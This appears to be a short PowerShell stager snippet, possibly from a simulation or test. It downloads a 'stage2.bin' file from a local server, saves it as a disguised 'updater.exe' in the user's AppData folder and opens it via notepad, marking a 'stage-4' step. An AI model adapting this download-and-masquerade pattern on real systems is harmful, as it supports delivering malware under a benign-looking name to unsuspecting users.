# Remote staging
try { $FetchUrl = 'http://localhost:9001/cdn/stage2.bin'; $LocalPath = "$env:APPDATA\updater.exe"; Invoke-WebRequest -Uri $FetchUrl -OutFile $LocalPath -UseBasicParsing; Start-Process -FilePath "notepad.exe" -ArgumentList $LocalPath; $StageMarker = "stage-4" } catch { Write-Warning "Stage transfer failed" }
